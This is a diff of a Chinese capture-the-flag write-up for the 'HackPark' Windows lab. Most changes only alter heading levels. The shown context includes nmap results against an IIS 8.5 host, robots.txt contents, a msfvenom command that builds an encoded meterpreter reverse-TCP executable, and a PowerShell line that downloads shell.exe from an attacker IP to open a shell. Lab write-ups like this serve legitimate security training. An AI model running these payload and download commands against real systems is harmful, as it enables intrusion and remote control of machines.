@@ -32,14 +32,14 @@ Not shown: 998 filtered portsPORT     STATE SERVICE80/tcp   open  http3389/tcp o
 > 目前使用默认扫描扫出来了两个端口 因此此时需要全端口扫一遍  
 > 还是觉得太少了
 
-##### [](#详细扫描一下80和3389 "详细扫描一下80和3389")详细扫描一下80和3389
+### [](#详细扫描一下80和3389 "详细扫描一下80和3389")详细扫描一下80和3389
 
 ```shell
 80/tcp   open  http           Microsoft IIS httpd 8.53389/tcp open  ms-wbt-server?| ssl-cert: Subject: commonName=hackpark| Not valid before: 2024-05-19T12:37:18|_Not valid after:  2024-11-18T12:37:181 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port3389-TCP:V=7.93%I=7%D=5/20%Time=664B470A%P=x86_64-pc-linux-gnu%r(TeSF:rminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\x0f\x08\0\x0SF:2\0\0\0");Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: WAP|phoneRunning: Linux 2.4.X|2.6.X, Sony Ericsson embeddedOS CPE: cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:sonyericsson:u8i_vivazOS details: Tomato 1.28 (Linux 2.4.20), Tomato firmware (Linux 2.6.22), Sony Ericsson U8i Vivaz mobile phoneService Info: OS: Windows;
 CPE: cpe:/o:microsoft:windows## 根据提供的信息，设备类型可能是无线接入点（WAP）或运行Linux 2.4.X或2.6.X的手机，可能带有索尼爱立信的嵌入式技术。具体的操作系统详细信息表明它可能运行着带有Linux 2.4.20或2.6.22的番茄固件，或者是索尼爱立信U8i Vivaz手机。此外，服务信息表明操作系统可能是WindowsTRACEROUTE (using port 3389/tcp)HOP RTT    ADDRESS1   ... 30
 ```
 
-##### [](#分析一波 "分析一波")分析一波
+### [](#分析一波 "分析一波")分析一波
 
 > 首先至少知道了  
 > web服务器Microsoft IIS httpd 8.5 并且可以确定了 基本os 就是windows  
@@ -54,7 +54,7 @@ CPE: cpe:/o:microsoft:windows## 根据提供的信息，设备类型可能是无
 
 ## [](#磨一下web "磨一下web")磨一下web
 
-##### [](#信息收集一波 "信息收集一波")信息收集一波
+### [](#信息收集一波 "信息收集一波")信息收集一波
 
 web信息收集[边缘资产收集](%E8%BE%B9%E7%BC%98%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86.md)
 
@@ -69,7 +69,7 @@ web信息收集[边缘资产收集](%E8%BE%B9%E7%BC%98%E8%B5%84%E4%BA%A7%E6%94%B
 
 > 敏感文件泄露可以看到一些
 
-##### [](#robots-txt "robots.txt")robots.txt
+### [](#robots-txt "robots.txt")robots.txt
 
 ```text
 User-agent: *Disallow: /Account/*.*Disallow: /searchDisallow: /search.aspxDisallow: /error404.aspxDisallow: /archiveDisallow: /archive.aspx        #Remove the '#' character below and replace example.com with your own website address.#sitemap: http://example.com/sitemap.axd # WebMatrix 1.0
@@ -211,7 +211,7 @@ windows机器
 
 [windows常规通道](windows%E5%B8%B8%E8%A7%84%E9%80%9A%E9%81%93.md)
 
-##### [](#meterpreter "meterpreter")meterpreter
+### [](#meterpreter "meterpreter")meterpreter
 
 ```shell
 ### 生成exe msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai  LHOST=IP LPORT=PORT -f exe -o shell-name.exe
@@ -220,7 +220,7 @@ windows机器
 
 > \*\*\*架设http服务 是的目标靶机可以获取 响应的exe 文件
 
-###### [](#运行payload "运行payload")运行payload
+#### [](#运行payload "运行payload")运行payload
 
 ```powershell
 下载:powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.69.232/shell.exe','shell.exe')"之后直接下载但是要保证一直在运行才能 获得持续的 shell运行就可以得到一个meterpreter 哦对还要打开 msf 的handler 进行一个监听
